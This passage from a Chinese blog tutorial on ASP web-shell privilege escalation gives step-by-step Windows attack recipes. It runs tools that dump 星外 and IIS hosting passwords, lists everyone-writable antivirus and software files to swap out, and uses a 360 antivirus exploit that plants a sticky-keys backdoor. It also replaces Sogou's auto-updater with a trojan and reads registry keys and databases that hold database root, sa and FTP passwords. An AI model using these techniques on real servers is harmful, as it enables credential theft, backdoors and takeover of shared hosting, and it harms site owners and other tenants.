+c:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Common Files<span class="token punctuation">\</span>Symantec Shared<span class="token punctuation">\</span>Validate.dat
+C:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Zend<span class="token punctuation">\</span>ZendOptimizer-3.3.0<span class="token punctuation">\</span>docs
+C:<span class="token punctuation">\</span>Documents and Settings<span class="token punctuation">\</span>All Users<span class="token punctuation">\</span>DRM<span class="token punctuation">\</span>
+C:<span class="token punctuation">\</span>Documents and Settings<span class="token punctuation">\</span>All Users<span class="token punctuation">\</span>Application Data<span class="token punctuation">\</span>McAfee<span class="token punctuation">\</span>DesktopProtection
+C:<span class="token punctuation">\</span>Documents and Settings<span class="token punctuation">\</span>All Users<span class="token punctuation">\</span>Application Data<span class="token punctuation">\</span>360safe<span class="token punctuation">\</span>softmgr<span class="token punctuation">\</span>
+C:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Zend<span class="token punctuation">\</span>ZendOptimizer-3.3.0<span class="token punctuation">\</span>lib<span class="token punctuation">\</span>Optimizer-3.3.0<span class="token punctuation">\</span>php-5.2.x<span class="token punctuation">\</span>ZendOptimizer.dll
+C:<span class="token punctuation">\</span>Documents and Settings<span class="token punctuation">\</span>All Users<span class="token punctuation">\</span>Application Data<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Media Index<span class="token punctuation">\</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br></div></div><h2 id="ee提权法"><a href="#ee提权法" class="header-anchor">#</a> ee提权法</h2> <p>找个可读可写目录上传ee.exe</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>cmd命令：/c c:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>temp<span class="token punctuation">\</span>cookies<span class="token punctuation">\</span>ee.exe -i  （获取星外帐号的id值，例如回显：FreeHost ID：724）
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>接着命令：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>/c c:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>temp<span class="token punctuation">\</span>cookies<span class="token punctuation">\</span>ee.exe -u <span class="token number">724</span>  （获取星外的帐号密码）
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="vbs提权法"><a href="#vbs提权法" class="header-anchor">#</a> vbs提权法</h2> <p>找个可读可写目录上传cscript.exe iispwd.vbs</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>cmd命令：/c “c:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>temp<span class="token punctuation">\</span>cookies<span class="token punctuation">\</span>cscript.exe” c:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>temp<span class="token punctuation">\</span>cookies<span class="token punctuation">\</span>iispwd.vbs
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>意思是读取iis，这样一来，不但可以获取星外的帐号密码，还可以看到同服务器上的所有站点的目录。
+可行思路大全：</p> <p>经测试以下目录中的文件权限均为everyone，可以修改，可以上传同文件名替换，删除，最重要的是还可以执行：</p> <p>360杀毒db文件替换:</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>c:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span><span class="token number">360</span><span class="token punctuation">\</span>360SD<span class="token punctuation">\</span>deepscan<span class="token punctuation">\</span>Section<span class="token punctuation">\</span>mutex.db
+c:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span><span class="token number">360</span><span class="token punctuation">\</span>360Safe<span class="token punctuation">\</span>deepscan<span class="token punctuation">\</span>Section<span class="token punctuation">\</span>mutex.db
+C:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span><span class="token number">360</span><span class="token punctuation">\</span>360Safe<span class="token punctuation">\</span>AntiSection<span class="token punctuation">\</span>mutex.db
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>IISrewrite3 文件替换：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>C:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Helicon<span class="token punctuation">\</span>ISAPI_Rewrite3<span class="token punctuation">\</span>Rewrite.log
+C:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Helicon<span class="token punctuation">\</span>ISAPI_Rewrite3<span class="token punctuation">\</span>httpd.conf
+C:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Helicon<span class="token punctuation">\</span>ISAPI_Rewrite3<span class="token punctuation">\</span>error.log
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>诺顿杀毒文件替换:</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>c:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Common Files<span class="token punctuation">\</span>Symantec Shared<span class="token punctuation">\</span>Persist.bak
+c:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Common Files<span class="token punctuation">\</span>Symantec Shared<span class="token punctuation">\</span>Validate.dat
+c:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Common Files<span class="token punctuation">\</span>Symantec Shared<span class="token punctuation">\</span>Persist.Dat
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>一流过滤相关目录及文件：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>C:<span class="token punctuation">\</span>7i24.com<span class="token punctuation">\</span>iissafe<span class="token punctuation">\</span>log<span class="token punctuation">\</span>startandiischeck.txt
+C:<span class="token punctuation">\</span>7i24.com<span class="token punctuation">\</span>iissafe<span class="token punctuation">\</span>log<span class="token punctuation">\</span>scanlog.htm
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>其他:
+Zend文件替换：<code>C:\Program Files\Zend\ZendOptimizer-3.3.0\lib\Optimizer-3.3.0\php-5.2.x\ZendOptimizer.dll</code>
+华盾文件替换：<code>C:\WINDOWS\hchiblis.ibl</code>
+Flash文件替换：<code>C:\WINDOWS\system32\Macromed\Flash\Flash10q.ocx</code>
+DU Meter流量统计信息日志文件替换：<code>c:\Documents and Settings\All Users\Application Data\Hagel Technologies\DU Meter\log.csv</code></p> <h2 id="_360提权"><a href="#_360提权" class="header-anchor">#</a> 360提权</h2> <p>找个可读可写目录上传360.exe</p> <p>cmd命令：<code>/c c:\windows\temp\cookies\360.exe</code></p> <p>会提示3段英文：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token number">360</span> Antivirus Privilege Escalation Exploit By friddy <span class="token number">2010.2</span>.2
+You will get a Shift5 door<span class="token operator">!</span>
+Shift5 Backdoor created<span class="token operator">!</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>这是成功的征兆，接着连接服务器连按5下shift键，将弹出任务管理器，点击新建任务：explorer.exe 会出现桌面，接下来大家都会弄了……</p> <h2 id="搜狗提权"><a href="#搜狗提权" class="header-anchor">#</a> 搜狗提权</h2> <p>搜狗的目录默认是可读可写的，搜狗每隔一段时间就会自动升级，而升级的文件是pinyinup.exe</p> <p>我们只要把这个文件替换为自己的远控木马，或是添加账户的批处理，等搜狗升级的时候，就可以达成我们的目的了。</p> <h2 id="华众虚拟主机提权"><a href="#华众虚拟主机提权" class="header-anchor">#</a> 华众虚拟主机提权</h2> <p>就经验来说，一般溢出提权对虚拟主机是无果的，而且华众又没有星外那么明显的漏洞。</p> <p>所以华众提权关键之处就是搜集信息，主要注册表位置：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>HKEY_LOCAL_MACHINE<span class="token punctuation">\</span>SOFTWARE<span class="token punctuation">\</span>HZHOST<span class="token punctuation">\</span>CONFIG<span class="token punctuation">\</span>
+HKEY_LOCAL_MACHINE<span class="token punctuation">\</span>software<span class="token punctuation">\</span>hzhost<span class="token punctuation">\</span>config<span class="token punctuation">\</span>settings<span class="token punctuation">\</span>mysqlpass     root密码
+HKEY_LOCAL_MACHINE<span class="token punctuation">\</span>software<span class="token punctuation">\</span>hzhost<span class="token punctuation">\</span>config<span class="token punctuation">\</span>settings<span class="token punctuation">\</span>mssqlpss       sa 密码
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>c:\windows\temp 下有hzhost主机留下的ftp登陆记录有用户名和密码</p> <p>以上信息配合hzhosts华众虚拟主机系统6.x 破解数据库密码工具使用</p> <p>百度搜索：hzhosts华众虚拟主机系统6.x 破解数据库密码工具</p> <p>(( N点虚拟主机 ))</p> <p>N点虚拟主机管理系统默认数据库地址为：\host_date#host # date#.mdb</p> <p>rl直接输入不行 这里咱们替换下 #=# 空格=</p> <p>修改后的下载地址为/host_date/#host # date#196.mdb</p> <p>N点数据库下载之后找到sitehost表 FTPuser&amp;FTPpass 值  FTPpass是N点加密数据然后用N点解密工具解密得到FTP密码</p> <p>N点默认安装路径<code>C:\Program Files\NpointSoft\npointhost\web\</code></p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>D:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>NpointSoft<span class="token punctuation">\</span>npointhost<span class="token punctuation">\</span>web<span class="token punctuation">\</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>默认权限可读。遇到对方所用虚拟主机是N点时候 可以考虑 读取该文件夹下载数据库</p> <p>N点解密工具代码。</p> <h2 id="写在最后"><a href="#写在最后" class="header-anchor">#</a> 写在最后</h2> <blockquote><p>如果你觉得冰河写的还不错，请微信搜索并关注「 <strong>冰河技术</strong> 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 <strong>冰河技术</strong> 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 <strong>冰河技术</strong> 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 <strong>冰河技术</strong> 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！</p></blockquote> <p><img alt="" data-src="https://img-blog.csdnimg.cn/20200906013715889.png" loading="lazy" class="lazy"></p></div> <footer class="page-edit"><div class="edit-link"><a href="https://github.com/binghe001/BingheGuide/edit/master/docs/md/hack/raising/2022-05-02-003-ASP-Web提权.md" target="_blank" rel="noopener noreferrer">在 GitHub 上编辑此页</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <div class="last-updated"><span class="prefix">上次更新: </span> <span class="time">2022/5/2</span></div></footer> <div class="page-nav"><p class="inner"><span class="prev">
+        ←
+        <a href="/md/hack/raising/2022-05-02-002-NC反弹CMDSHELL提权总结.html" class="prev">
+          NC反弹CMDSHELL提权总结
+        </a></span> <span class="next"><a href="/md/hack/raising/2022-05-02-004-MSF提权.html">
+          MSF提权
+        </a>
+        →
+      </span></p></div> </main></div> <aside class="page-sidebar"> <div class="page-side-toolbar"><div class="option-box-toc-fixed"><div class="toc-container-sidebar"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="max-height:650px"><div style="font-weight:bold;text-align:center;">ASP Web提权</div> <hr> <div class="toc-box"><ul class="toc-sidebar-links"><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#web提权" class="toc-sidebar-link">web提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#dos命令大全" class="toc-sidebar-link">dos命令大全</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#sql语句直接开启3389" class="toc-sidebar-link">SQL语句直接开启3389</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#常见杀软" class="toc-sidebar-link">常见杀软</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#windows提权中敏感目录和敏感注册表的利用" class="toc-sidebar-link">Windows提权中敏感目录和敏感注册表的利用</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#提权中的敏感注册表位置" class="toc-sidebar-link">提权中的敏感注册表位置</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#wscript-shell的删除和恢复" class="toc-sidebar-link">wscript.shell的删除和恢复</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#如何找到准确的终端连接端口" class="toc-sidebar-link">如何找到准确的终端连接端口？</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#iis6提权提示can-not-find-wmiprvse-exe的突破方法" class="toc-sidebar-link">iis6提权提示Can not find wmiprvse.exe的突破方法</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#本地溢出提权" class="toc-sidebar-link">本地溢出提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#sa提权" class="toc-sidebar-link">sa提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#root提权" class="toc-sidebar-link">root提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#如何查看root密码" class="toc-sidebar-link">如何查看root密码？</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#serv-u提权" class="toc-sidebar-link">serv-u提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#端口转发" class="toc-sidebar-link">端口转发</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#星外提权" class="toc-sidebar-link">星外提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#ee提权法" class="toc-sidebar-link">ee提权法</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#vbs提权法" class="toc-sidebar-link">vbs提权法</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#_360提权" class="toc-sidebar-link">360提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#搜狗提权" class="toc-sidebar-link">搜狗提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#华众虚拟主机提权" class="toc-sidebar-link">华众虚拟主机提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#写在最后" class="toc-sidebar-link">写在最后</a><ul class="toc-sidebar-sub-headers"></ul></li></ul></div></div></div></div></div> <div class="option-box-toc-over"><img src="/images/system/toc.png" class="nozoom"> <span class="show-txt">目录</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="max-height:550px"><div style="font-weight:bold;text-align:center;">ASP Web提权</div> <hr> <div class="toc-box"><ul class="toc-sidebar-links"><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#web提权" class="toc-sidebar-link">web提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#dos命令大全" class="toc-sidebar-link">dos命令大全</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#sql语句直接开启3389" class="toc-sidebar-link">SQL语句直接开启3389</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#常见杀软" class="toc-sidebar-link">常见杀软</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#windows提权中敏感目录和敏感注册表的利用" class="toc-sidebar-link">Windows提权中敏感目录和敏感注册表的利用</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#提权中的敏感注册表位置" class="toc-sidebar-link">提权中的敏感注册表位置</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#wscript-shell的删除和恢复" class="toc-sidebar-link">wscript.shell的删除和恢复</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#如何找到准确的终端连接端口" class="toc-sidebar-link">如何找到准确的终端连接端口？</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#iis6提权提示can-not-find-wmiprvse-exe的突破方法" class="toc-sidebar-link">iis6提权提示Can not find wmiprvse.exe的突破方法</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#本地溢出提权" class="toc-sidebar-link">本地溢出提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#sa提权" class="toc-sidebar-link">sa提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#root提权" class="toc-sidebar-link">root提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#如何查看root密码" class="toc-sidebar-link">如何查看root密码？</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#serv-u提权" class="toc-sidebar-link">serv-u提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#端口转发" class="toc-sidebar-link">端口转发</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#星外提权" class="toc-sidebar-link">星外提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#ee提权法" class="toc-sidebar-link">ee提权法</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#vbs提权法" class="toc-sidebar-link">vbs提权法</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#_360提权" class="toc-sidebar-link">360提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#搜狗提权" class="toc-sidebar-link">搜狗提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#华众虚拟主机提权" class="toc-sidebar-link">华众虚拟主机提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#写在最后" class="toc-sidebar-link">写在最后</a><ul class="toc-sidebar-sub-headers"></ul></li></ul></div></div></div></div></div> <div class="option-box"><img src="/images/system/wechat.png" class="nozoom"> <span class="show-txt">手机看</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="text-align:center"><span style="font-size:0.9rem">微信扫一扫</span> <img height="180px" src="https://api.qrserver.com/v1/create-qr-code/?data=https://binghe001.github.io/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html" style="margin:10px;">
+                可以<b>手机看</b>或分享至<b>朋友圈</b></div></div></div></div> <div class="option-box"><img src="/images/system/toggle.png" width="30px" class="nozoom"> <span class="show-txt">左栏</span></div> <div class="option-box"><img src="/images/system/xingqiu.png" width="25px" class="nozoom"> <span class="show-txt">星球</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="text-align:center"><span style="font-size:0.8rem;font-weight:bold;">实战项目<span style="font-size:8px;color:red;">「SpringCloud Alibaba实战项目」</span>、专属电子书、问题解答、简历指导、技术分享、晋升指导、视频课程</span> <img height="180px" src="/images/personal/xingqiu.png" style="margin:10px;"> <b>知识星球</b>：冰河技术
+            </div></div></div></div> <div class="option-box"><img src="/images/system/wexin4.png" width="25px" class="nozoom"> <span class="show-txt">读者群</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="text-align:center"><span style="font-size:0.8rem;font-weight:bold;">添加冰河微信<span style="color:red;">(hacker_binghe)</span>进冰河技术学习交流圈「无任何套路」</span> <img src="/images/personal/hacker_binghe.jpg" height="180px" style="margin:10px;">
+                PS：添加时请备注<b>读者加群</b>，谢谢！
+              </div></div></div></div> <div class="option-box"><img src="/images/system/download-2.png" width="25px" class="nozoom"> <span class="show-txt">下资料</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="text-align:center"><span style="font-size:0.8rem;font-weight:bold;">扫描公众号，回复<span style="color:red;">“1024”</span>下载<span style="color:red;">100GB+</span>学习技术资料、PDF书籍、实战项目、简历模板等「无任何套路」</span> <img src="/images/personal/qrcode.png" height="180px" style="margin:10px;"> <b>公众号:</b> 冰河技术
+              </div></div></div></div> <div class="option-box"><img src="/images/system/heart-1.png" width="25px" class="nozoom"> <span class="show-txt">赞赏我</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="text-align:center"><span style="font-size:0.8rem;font-weight:bold;">鼓励/支持/赞赏我</span> <img height="180px" src="/images/personal/encourage-head.png" style="margin:5px;"> <br>1. 不靠它生存但仍希望得到你的鼓励；
+                <br>2. 时刻警醒自己保持技术人的初心；
+              </div></div></div></div> <div title="NC反弹CMDSHELL提权总结" class="option-box" style="padding-left:2px;text-align:center;"><a href="/md/hack/raising/2022-05-02-002-NC反弹CMDSHELL提权总结.html"><img src="/images/system/pre2.png" width="30px" class="nozoom"> <span class="show-txt">上一篇</span></a></div> <div title="MSF提权" class="option-box" style="padding-left:2px;text-align:center;"><a href="/md/hack/raising/2022-05-02-004-MSF提权.html"><img src="/images/system/next2.png" width="30px" class="nozoom"> <span class="show-txt">下一篇</span></a></div></div>  <!----> </aside></div><div class="global-ui"><div class="read-more-wrap" style="display:none;position:absolute;bottom:0px;z-index:9999;width:100%;margin-top:-100px;font-family:PingFangSC-Regular, sans-serif;"><div id="read-more-mask" style="position: relative; height: 200px; background: -webkit-gradient(linear, 0 0%, 0 100%, from(rgba(255, 255, 255, 0)), to(rgb(255, 255, 255)));"></div> <a id="read-more-btn" target="_self" style="position: absolute; left: 50%; top: 70%; bottom: 30px; transform: translate(-50%, -50%); width: 160px; height: 36px; line-height: 36px; font-size: 15px; text-align: center; border: 1px solid rgb(222, 104, 109); color: rgb(222, 104, 109); background: rgb(255, 255, 255); cursor: pointer; border-radius: 6px;">阅读全文</a> <div id="btw-modal-wrap" style="display: none;"><div id="btw-mask" style="position: fixed; top: 0px; right: 0px; bottom: 0px; left: 0px; opacity: 0.7; z-index: 999; background: rgb(0, 0, 0);"></div> <div id="btw-modal" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 300px; text-align: center; font-size: 13px; background: rgb(255, 255, 255); border-radius: 10px; z-index: 9999; font-family: PingFangSC-Regular, sans-serif;"><span id="btw-modal-close-btn" style="position: absolute; top: 5px; right: 15px; line-height: 34px; font-size: 34px; cursor: pointer; opacity: 0.2; z-index: 9999; color: rgb(0, 0, 0); background: none; border: none; outline: none;">×</span> <p id="btw-modal-header" style="margin-top: 40px; line-height: 1.8; font-size: 13px;">
+                扫码或搜索：<span style="color: #E9405A; font-weight: bold;">冰河技术</span> <br>发送：<span id="fustack-token" class="token" style="color: #e9415a; font-weight: bold; font-size: 17px; margin-bottom: 45px;">290992</span> <br>即可<span style="color: #e9415a; font-weight: bold;">立即永久</span>解锁本站全部文章</p> <img src="/images/personal/qrcode.png" style="width: 180px; margin-top: 10px; margin-bottom: 30px; border: 8px solid rgb(230, 230, 230);"></div></div></div><div class="pay-read-more-wrap" style="display:none;position:absolute;bottom:0px;z-index:9999;width:100%;margin-top:-100px;font-family:PingFangSC-Regular, sans-serif;"><div id="pay-read-more-mask" style="position: relative; height: 200px; background: -webkit-gradient(linear, 0 0%, 0 100%, from(rgba(255, 255, 255, 0)), to(rgb(255, 255, 255)));"></div> <a id="pay-read-more-btn" target="_blank" style="position: absolute; left: 50%; top: 70%; bottom: 30px; transform: translate(-50%, -50%); width: 160px; height: 36px; line-height: 36px; font-size: 15px; text-align: center; border: 1px solid rgb(222, 104, 109); color: rgb(222, 104, 109); background: rgb(255, 255, 255); cursor: pointer; border-radius: 6px;">付费阅读</a></div></div></div>
+    <script src="/assets/js/cg-styles.js?v=1651501291226" defer></script><script src="/assets/js/cg-4.js?v=1651501291226" defer></script><script src="/assets/js/cg-3.js?v=1651501291226" defer></script><script src="/assets/js/cg-157.js?v=1651501291226" defer></script><script src="/assets/js/cg-5.js?v=1651501291226" defer></script><script src="/assets/js/cg-6.js?v=1651501291226" defer></script><script src="/assets/js/cg-app.js?v=1651501291226" defer></script>
+  </body>
+</html>
